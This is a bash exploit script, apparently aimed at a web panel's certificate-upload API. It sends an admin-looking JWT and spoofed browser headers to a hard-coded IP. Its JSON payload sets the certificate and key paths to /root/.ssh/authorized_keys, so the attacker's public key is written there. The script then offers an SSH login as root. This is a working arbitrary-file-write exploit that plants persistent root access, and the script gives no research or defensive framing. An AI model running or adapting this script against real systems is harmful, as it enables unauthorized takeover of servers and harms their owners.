#!/bin/bash

echo "Please enter your id_rsa public key (e.g., ssh-rsa AAA... user@host):"
read -r id_rsa_key
echo

if [[ -z "$id_rsa_key" ]]; then
    echo "Error: No public key provided. Exiting."
    exit 1
fi
echo

ssl_certificate_path="/root/.ssh/authorized_keys"
server="172.179.244.206:9000"
auth_token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJleHAiOjE3MzA5MzM4NzZ9.Z7FA6s0J32oGo231AD5vtrBZqUjpbvdvSw8ZsD1Z1Cw"

payload=$(cat <<EOF
{
  "name": "test",
  "ssl_certificate_path": "$ssl_certificate_path",
  "ssl_certificate_key_path": "$ssl_certificate_path",
  "ssl_certificate": "$id_rsa_key",
  "ssl_certificate_key": "$id_rsa_key"
}
EOF
)

# Check if curl is available
if ! command -v curl &> /dev/null; then
    echo "Error: curl is not installed. Please install curl to proceed."
    exit 1
fi

curl -X POST "http://$server/api/cert" \
     -H "Accept: application/json, text/plain, */*" \
     -H "Authorization: $auth_token" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36" \
     -H "Content-Type: application/json" \
     -H "Origin: http://$server" \
     -H "Referer: http://$server/" \
     -H "Accept-Encoding: gzip, deflate, br" \
     -H "Accept-Language: en-US,en;q=0.9" \
     -H "Connection: close" \
     -d "$payload"

sleep 0.5s
echo
echo

echo "Would you like to log in? (yes/no):"
read -r login_choice

if [[ "$login_choice" == "yes" ]]; then
    echo "Enter path for id_rsa key or press Enter for default (~/.ssh/id_rsa):"
    read -r key_path
    key_path=${key_path:-~/.ssh/id_rsa}

    ssh -i "$key_path" root@172.179.244.206
fi
